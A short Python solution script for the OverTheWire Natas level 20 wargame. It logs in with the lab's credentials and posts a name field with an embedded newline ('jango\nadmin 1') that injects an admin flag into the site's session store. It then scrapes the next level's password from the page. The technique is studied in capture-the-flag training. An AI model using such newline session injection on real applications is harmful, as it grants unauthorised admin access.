import requests
import re

username = "natas20"
password = "slOKYGsjlJhaqKliGvrgWAzln0JyrWao"
url = 'http://%s.natas.labs.overthewire.org/?debug=true' % username


session = requests.session()
session.post(url , auth=(username, password), data= {"name":"jango\nadmin 1"}) # \n creates a new session line, so "admin 1" is parsed as $_SESSION["admin"] = "1", giving us admin privileges.

response = session.get(url, auth=(username,password))

#print(response.text)
print (re.findall("Password: (.*)</pre>",response.text)[0])
